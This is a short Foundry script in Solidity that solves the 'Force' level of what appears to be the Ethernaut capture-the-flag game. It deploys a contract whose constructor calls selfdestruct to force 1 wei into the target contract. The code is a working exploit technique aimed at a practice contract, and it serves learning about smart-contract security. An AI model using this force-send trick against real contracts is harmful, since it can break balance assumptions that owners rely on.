// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/07-Force.sol";


contract Exploit {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract Exp is Script {

    Force public ForceInstance = Force(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    Exploit exploit;

    function run() external {
        vm.startBroadcast(hacker);
        //exploit = new Exploit{value: 1 wei}(ForceInstance);
        exploit = new Exploit{value: 1 wei}(payable(address(ForceInstance))); 
        vm.stopBroadcast();
    }
}